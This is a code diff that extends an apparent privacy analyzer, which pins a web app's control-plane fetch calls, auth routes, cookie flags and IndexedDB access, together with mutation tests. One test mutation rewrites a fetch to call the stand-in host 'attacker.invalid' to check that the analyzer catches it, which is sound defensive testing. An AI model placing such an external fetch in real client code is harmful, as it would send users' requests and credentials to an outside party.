@@ -131,6 +131,7 @@ function analyzeSource(fileName, text) {
   const sinkAliases = new Set();
   const engineWorker = relativeName === "workers/heel-review.worker.ts";
   const serverWorker = relativeName === "worker/index.ts";
+  const controlPlaneClient = relativeName === "lib/heel-cloud-api.ts";
   const constStringInitializers = new Map();
 
   function collectConstStringInitializers(node) {
@@ -213,6 +214,19 @@ function analyzeSource(fileName, text) {
       && request.arguments[1].getText(parsed) === "init";
   }
 
+  function reviewedSameOriginFetchCall(call) {
+    return controlPlaneClient
+      && ts.isCallExpression(call)
+      && !call.questionDotToken
+      && ts.isIdentifier(call.expression)
+      && call.expression.text === "fetch"
+      && enclosingFunctionName(call) === "sameOriginControlPlaneFetch"
+      && call.arguments.length === 2
+      && call.arguments[0].getText(parsed) === "path"
+      && call.arguments[1].getText(parsed) === "init"
+      && ts.isReturnStatement(call.parent);
+  }
+
   function allowedFetchReference(node) {
     const expression = node.getText(parsed);
     if (engineWorker && expression === "scope.fetch") {
@@ -237,7 +251,25 @@ function analyzeSource(fileName, text) {
     const expression = node.expression.getText(parsed);
     if (serverWorker && ["env.ASSETS.fetch", "handler.fetch"].includes(expression)) return true;
     if (reviewedControlPlaneFetchCall(node)) return true;
+    if (reviewedSameOriginFetchCall(node)) return true;
     return engineWorker && expression === "fetcher" && isReviewedFetcherCall(node);
+  }
+
+  function validateControlPlaneClientContract() {
+    if (!controlPlaneClient) return;
+    const sourceText = parsed.getFullText();
+    for (const fragment of [
+      'const CONTROL_PLANE_PREFIX = "/api/control-plane";',
+      "async function sameOriginControlPlaneFetch(path: string, init: RequestInit): Promise<Response> {\n  return fetch(path, init);\n}",
+      'if (!path.startsWith(`${CONTROL_PLANE_PREFIX}/v1/`) || path.includes("?") || path.includes("#"))',
+      'cache: "no-store",',
+      'credentials: "same-origin",',
+      'redirect: "error",',
+    ]) {
+      if (sourceText.split(fragment).length - 1 !== 1) {
+        report(parsed, `control-plane client is missing exact ${fragment}`);
+      }
+    }
   }
 
   function validateControlPlaneProxyContract() {
@@ -248,6 +280,9 @@ function analyzeSource(fileName, text) {
     return null;
   }
   const upstreamPath = pathname.slice(CONTROL_PLANE_PREFIX.length);
+  if ((upstreamPath === SIGNUP_ROUTE || upstreamPath === LOGIN_ROUTE || upstreamPath === LOGOUT_ROUTE)
+    && method === "POST") return upstreamPath;
+  if (upstreamPath === ME_ROUTE && method === "GET") return upstreamPath;
   if (PROJECTS_ROUTE.test(upstreamPath) && (method === "GET" || method === "POST")) {
     return upstreamPath;
   }
@@ -264,6 +299,10 @@ function analyzeSource(fileName, text) {
     for (const fragment of [
       'const CONTROL_PLANE_PREFIX = "/api/control-plane";',
       'const CONTROL_PLANE_ORIGIN = "https://heel-control-plane.internal";',
+      'const SIGNUP_ROUTE = "/v1/signup";',
+      'const LOGIN_ROUTE = "/v1/login";',
+      'const LOGOUT_ROUTE = "/v1/logout";',
+      'const ME_ROUTE = "/v1/me";',
       'const WORKSPACE_REF = "ws_[0-9a-f]{16}";',
       'const PROJECT_REF = "prj_[0-9a-f]{32}";',
       'const SYNCED_REVIEW_REF = "synrev_[0-9a-f]{32}";',
@@ -272,6 +311,8 @@ function analyzeSource(fileName, text) {
       'redirect: "manual",',
       "request.body!.pipeThrough(new FixedLengthStream(requestContract.contentLength))",
       "if (response.status >= 300 && response.status <= 399)",
+      '`heel_session=${match[1]}; HttpOnly; SameSite=Lax; Path=/; Secure`',
+      '"heel_session=; Max-Age=0; Path=/; HttpOnly; SameSite=Lax; Secure"',
       'if (requestUrl.search !== "") return proxyError(400, "invalid control plane request", csp);',
       'if (upstreamPath === "") return proxyError(404, "not found", csp);',
       "return proxyControlPlane(request, env, csp, upstreamPath);",
@@ -280,7 +321,11 @@ function analyzeSource(fileName, text) {
         report(parsed, `control-plane proxy is missing exact ${fragment}`);
       }
     }
-    if (sourceText.split("const headers = new Headers();").length - 1 !== 2) {
+    if (!sourceText.includes(
+      "function controlPlaneCredentials(source: Headers): Headers {\n  const headers = new Headers();",
+    ) || !sourceText.includes(
+      'function controlPlaneResponse(response: Response, csp: string, upstreamPath = ""): Response {\n  const headers = new Headers();',
+    )) {
       report(parsed, "control-plane request/response header allowlists are not the reviewed exact contract");
     }
     if (
@@ -446,7 +491,7 @@ function analyzeSource(fileName, text) {
     const call = member.parent;
     if (!ts.isCallExpression(call) || call.expression !== member) return false;
     const name = memberName(member);
-    if (["entries", "freeze", "fromEntries", "is", "keys"].includes(name ?? "")) return true;
+    if (["entries", "freeze", "fromEntries", "is", "keys", "values"].includes(name ?? "")) return true;
     return engineWorker
       && name === "defineProperty"
       && enclosingFunctionName(call) === "guardProperty"
@@ -568,11 +613,13 @@ function analyzeSource(fileName, text) {
 
   function allowedAmbientRootReference(node) {
     if (
-      relativeName === "lib/local-reviews.ts"
+      ((["lib/local-reviews.ts", "lib/findings-sync-queue.ts"].includes(relativeName)
+          && memberName(node.parent) === "indexedDB")
+        || (relativeName === "lib/findings-sync-queue.ts"
+          && memberName(node.parent) === "IDBKeyRange"))
       && node.text === "globalThis"
       && (ts.isPropertyAccessExpression(node.parent) || ts.isElementAccessExpression(node.parent))
       && node.parent.expression === node
-      && memberName(node.parent) === "indexedDB"
     ) return true;
     return node.text === "globalThis" && isReviewedWorkerScopeDeclaration(node);
   }
@@ -1198,7 +1245,16 @@ function analyzeSource(fileName, text) {
   }
 
   function visit(node) {
-    if (ts.isIdentifier(node) && isCapabilityIdentifierReference(node)) {
+    if (
+      ts.isIdentifier(node)
+      && isCapabilityIdentifierReference(node)
+      && !(
+        node.text === "fetch"
+        && ts.isCallExpression(node.parent)
+        && node.parent.expression === node
+        && allowedFetchCall(node.parent)
+      )
+    ) {
       report(node, `network sink capability reference ${node.text}`);
     }
     if (ts.isIdentifier(node) && isReflectiveRootReference(node)) {
@@ -1313,8 +1369,13 @@ function analyzeSource(fileName, text) {
         report(node, `durable/cache capability ${name}`);
       }
       if (root === "console") report(node, "console capability in customer boundary");
-      if (root === "globalThis" && name === "indexedDB" && relativeName !== "lib/local-reviews.ts") {
-        report(node, "IndexedDB capability outside the result-only store");
+      if (
+        root === "globalThis"
+        && ((name === "indexedDB"
+            && !["lib/local-reviews.ts", "lib/findings-sync-queue.ts"].includes(relativeName))
+          || (name === "IDBKeyRange" && relativeName !== "lib/findings-sync-queue.ts"))
+      ) {
+        report(node, "IndexedDB capability outside an approved local-only store");
       }
     }
 
@@ -1377,6 +1438,7 @@ function analyzeSource(fileName, text) {
     validateFindingsProjectionContract();
   }
   if (serverWorker) validateControlPlaneProxyContract();
+  if (controlPlaneClient) validateControlPlaneClientContract();
   return violations;
 }
 
@@ -2130,6 +2192,20 @@ Object.fromEntries([]);
     ),
     [],
   );
+  assert.deepEqual(
+    analyzeSource(
+      join(appRootPath, "lib/findings-sync-queue.ts"),
+      `const database = globalThis.indexedDB; const ranges = globalThis.IDBKeyRange;`,
+    ),
+    [],
+  );
+  assert.match(
+    analyzeSource(
+      join(appRootPath, "components/review/Unreviewed.tsx"),
+      `const ranges = globalThis.IDBKeyRange;`,
+    ).join("\n"),
+    /IndexedDB capability outside an approved local-only store/,
+  );
 });
 
 
@@ -2182,8 +2258,8 @@ test("the privacy analyzer pins the private control-plane fetch and route allowl
     {
       label: "response header copying",
       source: worker.replace(
-        "function controlPlaneResponse(response: Response, csp: string): Response {\n  const headers = new Headers();",
-        "function controlPlaneResponse(response: Response, csp: string): Response {\n  const headers = new Headers(response.headers);",
+        'function controlPlaneResponse(response: Response, csp: string, upstreamPath = ""): Response {\n  const headers = new Headers();',
+        'function controlPlaneResponse(response: Response, csp: string, upstreamPath = ""): Response {\n  const headers = new Headers(response.headers);',
       ),
       violation: "request/response header allowlists",
     },
@@ -2207,6 +2283,42 @@ test("the privacy analyzer pins the private control-plane fetch and route allowl
   for (const mutation of mutations) {
     assert.notEqual(mutation.source, worker, `${mutation.label} mutation did not apply`);
     const violations = analyzeSource(join(appRootPath, "worker/index.ts"), mutation.source);
+    assert.ok(
+      violations.some((violation) => violation.includes(mutation.violation)),
+      `${mutation.label}: ${violations.join("\n")}`,
+    );
+  }
+});
+
+
+test("the privacy analyzer pins the browser client to the same-origin closed control plane", async () => {
+  const client = await source("lib/heel-cloud-api.ts");
+  assert.deepEqual(analyzeSource(join(appRootPath, "lib/heel-cloud-api.ts"), client), []);
+  const mutations = [
+    {
+      label: "external fetch",
+      source: client.replace("return fetch(path, init);", 'return fetch("https://attacker.invalid", init);'),
+      violation: "network sink",
+    },
+    {
+      label: "query acceptance",
+      source: client.replace(' || path.includes("?")', ""),
+      violation: "path.includes",
+    },
+    {
+      label: "cross-origin credentials",
+      source: client.replace('credentials: "same-origin",', 'credentials: "include",'),
+      violation: "credentials",
+    },
+    {
+      label: "redirect following",
+      source: client.replace('redirect: "error",', 'redirect: "follow",'),
+      violation: "redirect",
+    },
+  ];
+  for (const mutation of mutations) {
+    assert.notEqual(mutation.source, client, `${mutation.label} mutation did not apply`);
+    const violations = analyzeSource(join(appRootPath, "lib/heel-cloud-api.ts"), mutation.source);
     assert.ok(
       violations.some((violation) => violation.includes(mutation.violation)),
       `${mutation.label}: ${violations.join("\n")}`,
